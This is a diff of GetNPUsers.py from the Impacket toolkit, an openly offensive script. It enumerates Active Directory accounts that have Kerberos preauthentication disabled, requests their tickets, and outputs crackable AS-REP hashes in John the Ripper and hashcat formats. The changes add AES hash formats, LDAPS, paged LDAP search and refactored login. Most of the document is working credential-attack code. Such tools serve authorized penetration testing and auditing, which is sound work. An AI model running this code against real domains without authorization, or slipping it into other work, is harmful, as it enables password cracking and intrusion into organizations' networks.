@@ -1,30 +1,31 @@
 #!/usr/bin/env python
-# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
+# Impacket - Collection of Python classes for working with network protocols.
 #
-# This software is provided under under a slightly modified version
+# Copyright Fortra, LLC and its affiliated companies 
+#
+# All rights reserved.
+#
+# This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
-# Author:
-#  Alberto Solino (@agsolino)
-#
 # Description:
-#    This script will attempt to list and get TGTs for those users that have the property
-#    'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
-#    For those users with such configuration, a John The Ripper output will be generated so
-#    you can send it for cracking.
+#   This script will attempt to list and get TGTs for those users that have the property
+#   'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH).
+#   For those users with such configuration, a John The Ripper output will be generated so
+#   you can send it for cracking.
 #
-#    Original credit for this technique goes to @harmj0y:
-#    https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/
-#    Related work by Geoff Janjua:
-#    https://www.exumbraops.com/layerone2016/party
+#   Original credit for this technique goes to @harmj0y:
+#   https://blog.harmj0y.net/activedirectory/roasting-as-reps/
+#   Related work by Geoff Janjua:
+#   https://www.exumbraops.com/layerone2016/party
 #
-#    For usage instructions run the script with no parameters
+#   For usage instructions run the script with no parameters.
 #
-# ToDo:
+# Author:
+#   Alberto Solino (@agsolino)
 #
-from __future__ import division
-from __future__ import print_function
+
 import argparse
 import datetime
 import logging
@@ -38,13 +39,14 @@ from pyasn1.type.univ import noValue
 from impacket import version
 from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
 from impacket.examples import logger
-from impacket.examples.utils import parse_credentials
+from impacket.examples.utils import parse_identity, ldap_login
 from impacket.krb5 import constants
 from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
 from impacket.krb5.kerberosv5 import sendReceive, KerberosError
 from impacket.krb5.types import KerberosTime, Principal
 from impacket.ldap import ldap, ldapasn1
-from impacket.smbconnection import SMBConnection
+from impacket import wintime
+
 
 class GetUserNoPreAuth:
     @staticmethod
@@ -68,6 +70,7 @@ class GetUserNoPreAuth:
         self.__username = username
         self.__password = password
         self.__domain = domain
+        self.__target = None
         self.__lmhash = ''
         self.__nthash = ''
         self.__no_pass = cmdLineOptions.no_pass
@@ -77,7 +80,10 @@ class GetUserNoPreAuth:
         self.__aesKey = cmdLineOptions.aesKey
         self.__doKerberos = cmdLineOptions.k
         self.__requestTGT = cmdLineOptions.request
-        self.__kdcHost = cmdLineOptions.dc_ip
+        #[!] in this script the value of -dc-ip option is self.__kdcIP and the value of -dc-host option is self.__kdcHost
+        self.__kdcIP = cmdLineOptions.dc_ip
+        self.__kdcHost = cmdLineOptions.dc_host
+        self.__ldaps = cmdLineOptions.ldaps
         if cmdLineOptions.hashes is not None:
             self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')
 
@@ -88,26 +94,6 @@ class GetUserNoPreAuth:
             self.baseDN += 'dc=%s,' % i
         # Remove last ','
         self.baseDN = self.baseDN[:-1]
-
-    def getMachineName(self):
-        if self.__kdcHost is not None:
-            s = SMBConnection(self.__kdcHost, self.__kdcHost)
-        else:
-            s = SMBConnection(self.__domain, self.__domain)
-        try:
-            s.login('', '')
-        except Exception:
-            if s.getServerName() == '':
-                raise Exception('Error while anonymous logging into %s')
-        else:
-            s.logoff()
-        return s.getServerName()
-
-    @staticmethod
-    def getUnixTime(t):
-        t -= 116444736000000000
-        t /= 10000000
-        return t
 
     def getTGT(self, userName, requestPAC=True):
 
@@ -146,7 +132,7 @@ class GetUserNoPreAuth:
 
         reqBody['realm'] = domain
 
-        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['rtime'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.getrandbits(31)
@@ -158,7 +144,7 @@ class GetUserNoPreAuth:
         message = encoder.encode(asReq)
 
         try:
-            r = sendReceive(message, domain, self.__kdcHost)
+            r = sendReceive(message, domain, self.__kdcIP)
         except KerberosError as e:
             if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                 # RC4 not available, OK, let's ask for newer types
@@ -166,7 +152,7 @@ class GetUserNoPreAuth:
                                     int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                 seq_set_iter(reqBody, 'etype', supportedCiphers)
                 message = encoder.encode(asReq)
-                r = sendReceive(message, domain, self.__kdcHost)
+                r = sendReceive(message, domain, self.__kdcIP)
             else:
                 raise e
 
@@ -181,22 +167,36 @@ class GetUserNoPreAuth:
             # The user doesn't have UF_DONT_REQUIRE_PREAUTH set
             raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)
 
+        # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
         if self.__outputFormat == 'john':
-            # Let's output the TGT enc-part/cipher in John format, in case somebody wants to use it.
-            return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
-                                               hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
-                                               hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
-        else:
-            # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
-            return '$krb5asrep$%d$%s@%s:%s$%s' % ( asRep['enc-part']['etype'], clientName, domain,
+            # Check what type of encryption is used for the enc-part data
+            # This will inform how the hash output needs to be formatted
+            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
+                return '$krb5asrep$%d$%s%s$%s$%s' % (asRep['enc-part']['etype'], domain, clientName,
+                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode(),
+                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode())
+            else:
+                return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                    hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
+        
+        # Let's output the TGT enc-part/cipher in Hashcat format, in case somebody wants to use it.
+        else:
+            # Check what type of encryption is used for the enc-part data
+            # This will inform how the hash output needs to be formatted
+            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
+                return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
+                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
+                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
+            else:
+                return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
+                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
+                                                      hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
 
     @staticmethod
     def outputTGT(entry, fd=None):
-        if fd is None:
-            print(entry)
-        else:
+        print(entry)
+        if fd is not None:
             fd.write(entry + '\n')
 
     def run(self):
@@ -204,46 +204,26 @@ class GetUserNoPreAuth:
             self.request_users_file_TGTs()
             return
 
-        if self.__doKerberos:
-            target = self.getMachineName()
-        else:
-            if self.__kdcHost is not None:
-                target = self.__kdcHost
-            else:
-                target = self.__domain
-
         # Are we asked not to supply a password?
         if self.__doKerberos is False and self.__no_pass is True:
             # Yes, just ask the TGT and exit
             logging.info('Getting TGT for %s' % self.__username)
             entry = self.getTGT(self.__username)
-            self.outputTGT(entry, None)
+            self.request_multiple_TGTs([self.__username])
             return
 
-        # Connect to LDAP
         try:
-            ldapConnection = ldap.LDAPConnection('ldap://%s' % target, self.baseDN, self.__kdcHost)
-            if self.__doKerberos is not True:
-                ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-            else:
-                ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
-                                             self.__aesKey, kdcHost=self.__kdcHost)
+            # Connect to LDAP
+            ldapConnection = ldap_login(self.__target, self.baseDN, self.__kdcIP, self.__kdcHost, self.__doKerberos, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, ldaps_flag=self.__ldaps)
+            # updating "self.__target" as it may have changed in the ldap_login processing
+            self.__target = ldapConnection._dstHost
         except ldap.LDAPSessionError as e:
-            if str(e).find('strongerAuthRequired') >= 0:
-                # We need to try SSL
-                ldapConnection = ldap.LDAPConnection('ldaps://%s' % target, self.baseDN, self.__kdcHost)
-                if self.__doKerberos is not True:
-                    ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-                else:
-                    ldapConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
-                                                 self.__aesKey, kdcHost=self.__kdcHost)
-            else:
+            if str(e).find('strongerAuthRequired') < 0:
                 # Cannot authenticate, we will try to get this users' TGT (hoping it has PreAuth disabled)
                 logging.info('Cannot authenticate %s, getting its TGT' % self.__username)
                 entry = self.getTGT(self.__username)
-                self.outputTGT(entry, None)
+                self.request_multiple_TGTs([self.__username])   
                 return
-
 
         # Building the search filter
         searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
@@ -252,18 +232,27 @@ class GetUserNoPreAuth:
 
         try:
             logging.debug('Search Filter=%s' % searchFilter)
+            # Microsoft Active Directory set an hard limit of 1000 entries returned by any search
+            paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)
+
             resp = ldapConnection.search(searchFilter=searchFilter,
                                          attributes=['sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
-                                         sizeLimit=999)
+                                         searchControls=[paged_search_control])
         except ldap.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
+                # We should never reach this code as we use paged search now
                 logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
-                # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
-                # paged queries
                 resp = e.getAnswers()
                 pass
             else:
+                if str(e).find('NTLMAuthNegotiate') >= 0:
+                    logging.critical("NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos "
+                                     "authentication instead.")
+                else:
+                    if self.__kdcIP is not None and self.__kdcHost is not None:
+                        logging.critical("If the credentials are valid, check the hostname and IP address of KDC. They "
+                                         "must match exactly each other")
                 raise
 
         answers = []
@@ -291,12 +280,12 @@ class GetUserNoPreAuth:
                         if str(attribute['vals'][0]) == '0':
                             pwdLastSet = '<never>'
                         else:
-                            pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                            pwdLastSet = str(wintime.filetime_to_datetime(int(str(attribute['vals'][0]))))
                     elif str(attribute['type']) == 'lastLogon':
                         if str(attribute['vals'][0]) == '0':
                             lastLogon = '<never>'
                         else:
-                            lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
+                            lastLogon = str(wintime.filetime_to_datetime(int(str(attribute['vals'][0]))))
                 if mustCommit is True:
                     answers.append([sAMAccountName,memberOf, pwdLastSet, lastLogon, userAccountControl])
             except Exception as e:
@@ -316,7 +305,6 @@ class GetUserNoPreAuth:
             print("No entries found!")
 
     def request_users_file_TGTs(self):
-
         with open(self.__usersFile) as fi:
             usernames = [line.strip() for line in fi]
 
@@ -345,9 +333,9 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = True, description = "Queries target domain for users with "
                                   "'Do not require Kerberos preauthentication' set and export their TGTs for cracking")
 
-    parser.add_argument('target', action='store', help='domain/username[:password]')
+    parser.add_argument('target', action='store', help='[[domain/]username[:password]]')
     parser.add_argument('-request', action='store_true', default=False, help='Requests TGT for users and output them '
-                                                                             'in JtR/hashcat format (default False)')
+                                                                               'in JtR/hashcat format (default False)')
     parser.add_argument('-outputfile', action='store',
                         help='Output filename to write ciphers in JtR/hashcat format')
 
@@ -360,7 +348,6 @@ if __name__ == '__main__':
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
 
     group = parser.add_argument_group('authentication')
-
     group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
     group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
     group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
@@ -369,9 +356,15 @@ if __name__ == '__main__':
                                                        'line')
     group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication '
                                                                             '(128 or 256 bits)')
-    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
+
+    group = parser.add_argument_group('connection')
+    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller. If '
                                                                               'ommited it use the domain part (FQDN) '
                                                                               'specified in the target parameter')
+    group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use. '
+                                                                              'If ommited, the domain part (FQDN) '
+                                                                              'specified in the account parameter will be used')
+    group.add_argument('-ldaps', '-use-ldaps', dest='ldaps', action='store_true', help='Use LDAPS instead of LDAP')
 
     if len(sys.argv)==1:
         parser.print_help()
@@ -387,34 +380,20 @@ if __name__ == '__main__':
         print("\n3. Request TGTs for all users")
         print("\n\tGetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily")
         print("\n4. Request TGTs for users in a file")
-        print("\n\tGetNPUsers.py contoso.com/ -no-pass -usersfile users.txt")
+        print("\n\tGetNPUsers.py -no-pass -usersfile users.txt contoso.com/")
         print("\nFor this operation you don\'t need credentials.")
         sys.exit(1)
 
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init(options.ts)
+    logger.init(options.ts, options.debug)
 
-    if options.debug is True:
-        logging.getLogger().setLevel(logging.DEBUG)
-        # Print the Library's installation path
-        logging.debug(version.getInstallationPath())
-    else:
-        logging.getLogger().setLevel(logging.INFO)
-
-    domain, username, password = parse_credentials(options.target)
+    domain, username, password, _, _, options.k = parse_identity(options.target, options.hashes, options.no_pass, options.aesKey, options.k)
 
     if domain == '':
         logging.critical('Domain should be specified!')
         sys.exit(1)
-
-    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
-        from getpass import getpass
-        password = getpass("Password:")
-
-    if options.aesKey is not None:
-        options.k = True
 
     if options.k is False and options.no_pass is True and username == '' and options.usersfile is None:
         logging.critical('If the -no-pass option was specified, but Kerberos (-k) is not used, then a username or the -usersfile option should be specified!')
